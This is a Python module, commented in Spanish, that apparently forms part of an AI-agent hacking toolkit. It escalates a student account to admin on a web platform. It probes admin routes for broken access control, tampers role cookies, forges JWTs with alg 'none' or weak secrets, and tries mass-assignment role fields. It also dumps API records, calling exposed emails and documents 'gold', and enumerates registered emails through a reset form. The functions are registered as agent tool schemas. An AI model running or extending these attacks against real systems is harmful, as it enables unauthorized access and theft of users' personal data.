"""Escalada de rol (aprendiz -> admin) sobre una sesion ya abierta.

Verifica cada intento contra una ruta protegida, no adivina.
Se engancha a hack_api igual que intruso_api. Solo Python puro.
"""
import base64, hashlib, hmac, json, re, time
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin, urlparse, urlencode, quote, unquote
import requests
import hack_api as H
import intruso_api as I

MAX_RUTAS_ROL, MAX_HILOS, MAX_CAMPOS = 60, 6, 14
CAMPOS_ROL = ('rol', 'Rol', 'role', 'Role', 'id_rol', 'idRol', 'IdRol', 'rol_id',
              'tipo_usuario', 'tipoUsuario', 'perfil', 'Perfil', 'es_admin', 'esAdmin',
              'isAdmin', 'is_admin', 'nivel', 'privilegios', 'permisos')
VALORES_ROL = ('admin', '1', 'true', 'Administrador', '2', 'instructor')
RUTAS_ROL = ('Admin Admin/Usuarios Admin/Roles Usuarios Usuarios/Index Usuarios/Crear '
             'Usuarios/Editar Aprendices Instructores Fichas Programas Matriculas '
             'Roles Permisos Seguridad Seguridad/Usuarios Configuracion Parametros '
             'Auditoria Reportes Reportes/Usuarios Notas Notas/Registrar Entregas/Calificar '
             'Cursos/Crear Gestion Coordinacion Dashboard/Admin Home/Admin '
             'api/usuarios api/users api/roles api/admin/usuarios api/v1/usuarios '
             'api/Admin/Usuarios Usuarios/Listar Aprendices/Listar').split()

def _abierta(r):
    if r is None or r.status_code >= 400:
        return False
    if len(r.content or b'') < 200:
        return False
    if 'login' in (r.url or '').lower():
        return False
    if re.search(r'type=["\']password', (r.text or '')[:9000], re.I):
        return False
    return True

def _sin_sesion(u):
    try:
        return requests.get(u, headers={'User-Agent': H.UA}, timeout=H.TIMEOUT,
                            allow_redirects=True, verify=False)
    except Exception:
        return None

def forzar_panel(base, rutas=None, limite=30):
    u = H._norm(base)
    if not u:
        return {'ok': False, 'error': 'URL invalida'}
    raiz = I._base(u) + '/'
    extra = [x.strip() for x in re.split(r'[,\n]+', str(rutas)) if x.strip()][:40] if rutas else []
    lista = (extra + RUTAS_ROL)[:min(int(limite or 30), MAX_RUTAS_ROL)]

    def uno(r):
        x, err = H._pedir(raiz + r)
        if err or x is None or not _abierta(x):
            return None
        y = _sin_sesion(raiz + r)
        publica = _abierta(y)
        return {'ruta': r, 'status': x.status_code, 'largo': len(x.content or b''),
                'titulo': H._titulo(x.text), 'roto': not publica}

    with ThreadPoolExecutor(max_workers=MAX_HILOS) as ex:
        filas = [x for x in ex.map(uno, lista) if x]
    filas.sort(key=lambda f: not f['roto'])
    rotas = [f for f in filas if f['roto']]
    for f in rotas[:6]:
        H._anotar('Control de acceso roto', 'alta', raiz + f['ruta'],
                  'abre con rol aprendiz', f['titulo'])
    return {'ok': True, 'probadas': len(lista), 'halladas': filas[:40],
            'rotas': [f['ruta'] for f in rotas][:20],
            'nota': 'rotas=true = solo abre con tu sesion: el rol no se valida. Ya estas viendo de mas.'}

def decodificar_cookie(nombre=None):
    out = []
    for c in H._sesion().cookies:
        if nombre and c.name != nombre:
            continue
        t = unquote(c.value or '')
        capas = []
        for _ in range(2):
            try:
                b = base64.urlsafe_b64decode(t + '=' * (-len(t) % 4)).decode('utf-8', 'ignore')
                if b and sum(ch.isprintable() for ch in b) > len(b) * 0.8:
                    capas.append(H._recorte(b, 300))
                    t = b
            except Exception:
                break
        pistas = [k for k in CAMPOS_ROL if k.lower() in t.lower()]
        if capas or pistas:
            out.append({'nombre': c.name, 'largo': len(c.value or ''), 'capas': capas,
                        'pistas': pistas, 'crudo': H._recorte(c.value or '', 220)})
    return {'ok': True, 'cookies': out,
            'nota': 'Si el rol viaja en claro o en base64 sin firmar, se cambia a mano.'}

def tamper_cookie(nombre, valor, canario=None):
    if not nombre:
        return {'ok': False, 'error': 'falta el nombre de la cookie'}
    antes = None
    if canario:
        ra, ea = H._pedir(canario)
        antes = _abierta(ra) if not ea else None
    H._sesion().cookies.set(nombre, valor)
    despues = None
    if canario:
        rd, ed = H._pedir(canario)
        if ed:
            return ed
        despues = _abierta(rd)
    logrado = (antes is False and despues is True)
    if logrado:
        H._anotar('Cookie manipulada', 'critica', canario or nombre,
                  nombre + '=' + valor, '')
    return {'ok': True, 'cookie': nombre, 'valor': valor, 'antes': antes,
            'despues': despues, 'logrado': logrado,
            'nota': 'Se aplico en la sesion viva. Si no funciono, el valor no era el correcto o va firmado.'}

def _b64(d):
    return base64.urlsafe_b64encode(json.dumps(d, separators=(',', ':')).encode()).decode().rstrip('=')

def forjar_jwt(token, cambios='', secreto='', alg='none'):
    t = (token or '').strip()
    if t.lower().startswith('bearer '):
        t = t[7:].strip()
    pt = t.split('.')
    if len(pt) < 2:
        return {'ok': False, 'error': 'no parece un JWT'}
    def dec(s):
        try:
            return json.loads(base64.urlsafe_b64decode(s + '=' * (-len(s) % 4)))
        except Exception:
            return {}
    cab, cue = dec(pt[0]), dec(pt[1])
    for par in str(cambios or '').split(','):
        if '=' in par:
            k, v = par.split('=', 1)
            v = v.strip()
            cue[k.strip()] = True if v.lower() == 'true' else (int(v) if v.isdigit() else v)
    algo = (alg or 'none').upper()
    cab['alg'] = 'none' if algo == 'NONE' else 'HS256'
    cuerpo = _b64(cab) + '.' + _b64(cue)
    if algo == 'NONE' or not secreto:
        nuevo = cuerpo + '.'
    else:
        firma = hmac.new(secreto.encode(), cuerpo.encode(), hashlib.sha256).digest()
        nuevo = cuerpo + '.' + base64.urlsafe_b64encode(firma).decode().rstrip('=')
    return {'ok': True, 'token': nuevo, 'cabecera': cab, 'cuerpo': cue,
            'nota': 'Mandalos con peticion_auth en el header Authorization: Bearer <token> o '
                    'en la cookie que lo guardaba.'}

def probar_masivo(url_perfil, datos=None, canario=None, url_login=None,
                  usuario=None, clave=None, limite=10):
    u = H._norm(url_perfil)
    if not u:
        return {'ok': False, 'error': 'URL invalida'}
    r0, err = H._pedir(u)
    if err:
        return err
    base = {}
    for nombre, tipo, valor in I._inputs(r0.text or ''):
        if tipo not in ('hidden', 'password', 'submit', 'button', 'file', 'checkbox'):
            base[nombre] = valor
    for par in str(datos or '').split(','):
        if '=' in par:
            k, v = par.split('=', 1)
            base[k.strip()] = v.strip()
    if not base:
        return {'ok': False, 'error': 'no encontre campos en el perfil; pasa datos k=v'}

    def enviar(extra):
        rp, e = H._pedir(u)
        if e:
            return e
        cuerpo = dict(base)
        cuerpo.update(H._ocultos(rp.text or ''))
        cuerpo.update(extra)
        r, e2 = H._pedir(u, 'POST',
                         {'Content-Type': 'application/x-www-form-urlencoded', 'Referer': u},
                         urlencode(cuerpo))
        if e2:
            return e2
        return {'ok': r.status_code < 400, 'status': r.status_code,
                'muestra': H._recorte(r.text, 400)}

    def verificar():
        if url_login and usuario and clave:
            I.entrar(url_login, usuario, clave)
        if not canario:
            return None
        r, e = H._pedir(canario)
        if e or r is None:
            return None
        return _abierta(r)

    campos = list(CAMPOS_ROL)[:max(1, min(int(limite or 10), MAX_CAMPOS))]
    intentos, logrados = 0, []
    for valor in VALORES_ROL[:3]:
        enviar({c: valor for c in campos})
        intentos += 1
        if verificar():
            logrados = campos
            H._anotar('Escalada por asignacion masiva', 'critica', u,
                      'campos ' + ','.join(campos) + ' = ' + valor, '')
            return {'ok': True, 'logrado': True, 'via': 'combinado',
                    'campos': campos, 'valor': valor, 'intentos': intentos,
                    'nota': 'El backend acepto campos de rol. Vuelve a entrar y ya eres ' + valor + '.'}
        time.sleep(0.3)
    for c in campos:
        for valor in VALORES_ROL[:2]:
            enviar({c: valor})
            intentos += 1
            if verificar():
                H._anotar('Escalada por asignacion masiva', 'critica', u, c + '=' + valor, '')
                return {'ok': True, 'logrado': True, 'via': 'individual',
                        'campo': c, 'valor': valor, 'intentos': intentos}
            time.sleep(0.3)
    return {'ok': True, 'logrado': False, 'intentos': intentos,
            'nota': 'No subio por aqui. Sin canario no hay confirmacion: pasa canario= o revisa el perfil a ojo.'}

def api_json(url, metodo='GET', cuerpo='', token=None, cabeceras=None):
    u = H._norm(url)
    if not u:
        return {'ok': False, 'error': 'URL invalida'}
    h = {'Content-Type': 'application/json', 'Accept': 'application/json'}
    if token:
        h['Authorization'] = token if token.lower().startswith('bearer ') else 'Bearer ' + token
    h.update(cabeceras or {})
    r, err = H._pedir(u, metodo, h, cuerpo or None)
    if err:
        return err
    datos = None
    try:
        datos = r.json()
    except Exception:
        pass
    return {'ok': r.status_code < 400, 'status': r.status_code, 'json': datos,
            'cuerpo': None if datos is not None else H._recorte(r.text, 800),
            'nota': 'Si devuelve lista con tu sesion de aprendiz, la API no valida rol.'}

def sacar_api(url, max_filas=40, paginar=True):
    u = H._norm(url)
    if not u:
        return {'ok': False, 'error': 'URL invalida'}
    tope = max(1, min(int(max_filas or 40), 60))
    salida, claves, actual, paginas = [], set(), u, 0
    while actual and paginas < 4 and len(salida) < tope:
        r, err = H._pedir(actual)
        if err:
            return err
        paginas += 1
        try:
            d = r.json()
        except Exception:
            break
        filas = d if isinstance(d, list) else next(
            (v for v in (d.values() if isinstance(d, dict) else []) if isinstance(v, list)), [])
        for f in filas[:tope]:
            if isinstance(f, dict):
                claves |= set(f)
                salida.append(f)
        if not paginar:
            break
        sep = '&' if '?' in actual else '?'
        actual = actual + sep + 'page=' + str(paginas + 1)
    if salida:
        H._anotar('API filtro datos', 'alta', u, f'{len(salida)} registros', ', '.join(sorted(claves)[:8]))
    return {'ok': True, 'url': u, 'registros': salida[:tope], 'claves': sorted(claves)[:40],
            'total': len(salida),
            'nota': 'Claves = columnas que la API expone. Si hay correo, documento o clave, eso es oro.'}

def sondeo_correos(url_solicitud, correos, maximo=15, pausa=0.4):
    u = H._norm(url_solicitud)
    if not u:
        return {'ok': False, 'error': 'URL invalida'}
    lista = [c.strip() for c in re.split(r'[,\s\n]+', str(correos or '')) if '@' in c][:maximo]
    if not lista:
        return {'ok': False, 'error': 'pasa correos separados por comas'}
    r0, err = H._pedir(u)
    if err:
        return err
    ocultos = H._ocultos(r0.text or '')
    campo = 'Email'
    m = re.search(r'<input[^>]+name=["\']([^"\']+)["\'][^>]*type=["\']email', r0.text or '', re.I)
    if m:
        campo = m.group(1)
    filas = []
    for c in lista:
        cuerpo = dict(ocultos)
        cuerpo[campo] = c
        r, e = H._pedir(u, 'POST',
                        {'Content-Type': 'application/x-www-form-urlencoded', 'Referer': u},
                        urlencode(cuerpo))
        if e or r is None:
            filas.append({'correo': c, 'existe': None})
            continue
        bajo = (r.text or '').lower()
        envio = any(x in bajo for x in ('enviad', 'enviamos', 'revisa tu correo'))
        falta = any(x in bajo for x in ('no existe', 'no esta', 'no está', 'no registrad', 'no encontramos'))
        filas.append({'correo': c, 'status': r.status_code,
                      'existe': True if envio and not falta else (False if falta else None),
                      'muestra': H._recorte(r.text, 200)})
        time.sleep(float(pausa))
    vivos = [f['correo'] for f in filas if f['existe']]
    if vivos:
        H._anotar('Correos registrados enumerados', 'media', u, f'{len(vivos)} de {len(filas)}', ', '.join(vivos[:4]))
    return {'ok': True, 'filas': filas, 'existen': vivos, 'probados': len(filas),
            'nota': 'existe=null significa respuesta ambigua: mira muestra a ojo.'}

def escalada_auto(base, url_login=None, url_perfil=None, usuario=None, clave=None):
    u = H._norm(base)
    if not u:
        return {'ok': False, 'error': 'URL invalida'}
    log = []
    panel = forzar_panel(u, limite=34)
    rotas = panel.get('rotas') or []
    if rotas:
        log.append({'via': 'control de acceso roto', 'rutas': rotas[:10]})
    galletas = decodificar_cookie()
    if galletas.get('cookies'):
        log.append({'via': 'cookies con datos de rol', 'cookies': galletas['cookies'][:4]})
    canario = (I._base(u) + '/' + rotas[0]) if rotas else None
    if url_perfil:
        log.append({'via': 'asignacion masiva',
                    'res': probar_masivo(url_perfil, canario=canario, url_login=url_login,
                                         usuario=usuario, clave=clave, limite=8)})
    token = ''
    for c in H._sesion().cookies:
        if c.name.lower() in ('token', 'jwt', 'access_token', 'auth'):
            token = c.value
    if token:
        log.append({'via': 'jwt', 'res': forjar_jwt(token, 'rol=admin,role=admin,id_rol=1')})
    gano = [x for x in log if x.get('res', {}).get('logrado') or x.get('via') == 'control de acceso roto']
    return {'ok': True, 'ganado': bool(gano), 'canario': canario, 'detalle': log,
            'nota': 'Ganado = ya lees admin sin serlo. Cierra con reporte.'}

NOMBRES = ('sondeo_correos', 'forzar_panel', 'decodificar_cookie', 'tamper_cookie', 'forjar_jwt',
           'probar_masivo', 'api_json', 'sacar_api', 'escalada_auto')

def _e(n, d, props, req=()):
    return {'name': n, 'description': d,
            'parameters': {'type': 'object', 'properties': props, 'required': list(req)}}

HERRAMIENTAS = [
    _e('forzar_panel', 'Prueba rutas de admin con la sesion del rol bajo y dice cuales abren '
       'sin validar el rol. Empieza por aqui.', {'url': {'type': 'string'},
       'rutas': {'type': 'string'}, 'limite': {'type': 'integer'}}, ('url',)),
    _e('decodificar_cookie', 'Muestra cookies que llevan el rol en claro o en base64.',
       {'nombre': {'type': 'string'}}, ()),
    _e('tamper_cookie', 'Cambia una cookie en la sesion viva y comprueba con un canario si '
       'abre mas.', {'nombre': {'type': 'string'}, 'valor': {'type': 'string'},
       'canario': {'type': 'string'}}, ('nombre', 'valor')),
    _e('forjar_jwt', 'Reescribe un JWT poniendo rol admin (alg none o secreto debil).',
       {'token': {'type': 'string'}, 'cambios': {'type': 'string'},
        'secreto': {'type': 'string'}, 'alg': {'type': 'string'}}, ('token',)),
    _e('probar_masivo', 'Manda campos de rol escondidos al editar perfil y verifica contra un '
       'canario. Pasa url_login y usuario/clave para recargar el rol.', {'url_perfil': {'type': 'string'},
       'datos': {'type': 'string'}, 'canario': {'type': 'string'}, 'url_login': {'type': 'string'},
       'usuario': {'type': 'string'}, 'clave': {'type': 'string'}, 'limite': {'type': 'integer'}},
       ('url_perfil',)),
    _e('api_json', 'Peticion JSON con token opcional.', {'url': {'type': 'string'},
       'metodo': {'type': 'string'}, 'cuerpo': {'type': 'string'}, 'token': {'type': 'string'},
       'cabeceras': {'type': 'object'}}, ('url',)),
    _e('sacar_api', 'Volca registros de una API JSON, paginando.', {'url': {'type': 'string'},
       'max_filas': {'type': 'integer'}, 'paginar': {'type': 'boolean'}}, ('url',)),
    _e('escalada_auto', 'Corre toda la cadena de escalada y resume que funciono.',
       {'base': {'type': 'string'}, 'url_login': {'type': 'string'},
        'url_perfil': {'type': 'string'}, 'usuario': {'type': 'string'},
        'clave': {'type': 'string'}}, ('base',)),
]

def _despachar(nombre, a):
    if nombre == 'forzar_panel':
        return forzar_panel(a.get('url'), a.get('rutas'), a.get('limite') or 30)
    if nombre == 'decodificar_cookie':
        return decodificar_cookie(a.get('nombre'))
    if nombre == 'tamper_cookie':
        return tamper_cookie(a.get('nombre'), a.get('valor'), a.get('canario'))
    if nombre == 'forjar_jwt':
        return forjar_jwt(a.get('token'), a.get('cambios'), a.get('secreto'), a.get('alg'))
    if nombre == 'probar_masivo':
        return probar_masivo(a.get('url_perfil'), a.get('datos'), a.get('canario'),
                             a.get('url_login'), a.get('usuario'), a.get('clave'),
                             a.get('limite') or 10)
    if nombre == 'api_json':
        return api_json(a.get('url'), a.get('metodo') or 'GET', a.get('cuerpo'),
                        a.get('token'), a.get('cabeceras'))
    if nombre == 'sacar_api':
        return sacar_api(a.get('url'), a.get('max_filas') or 40, a.get('paginar', True))
    if nombre == 'sondeo_correos':
        return sondeo_correos(a.get('url_solicitud'), a.get('correos'), a.get('maximo') or 15)
    if nombre == 'escalada_auto':
        return escalada_auto(a.get('base'), a.get('url_login'), a.get('url_perfil'),
                             a.get('usuario'), a.get('clave'))
    return {'ok': False, 'error': 'desconocida: ' + str(nombre)}

def herramienta(nombre, args):
    a = args if isinstance(args, dict) else {}
    try:
        return _despachar(nombre, a)
    except Exception as e:
        print('[ESCALADA]', e)
        return {'ok': False, 'error': 'fallo: ' + str(e)[:150]}

H.NOMBRES = tuple(H.NOMBRES) + NOMBRES
H.NOMBRES = H.NOMBRES + ('sondeo_correos',)
H.HERRAMIENTAS.extend(HERRAMIENTAS)
_ORIGINAL = H.herramienta

def _gancho(nombre, args):
    if nombre in NOMBRES:
        return herramienta(nombre, args)
    return _ORIGINAL(nombre, args)

H.herramienta = _gancho

HERRAMIENTAS.append(_e('sondeo_correos', 'Enumera correos registrados con el formulario de '
                       'recordar alias. Sirve para saber que cuentas existen.', {'url_solicitud':
                       {'type': 'string'}, 'correos': {'type': 'string'},
                       'maximo': {'type': 'integer'}}, ('url_solicitud', 'correos')))
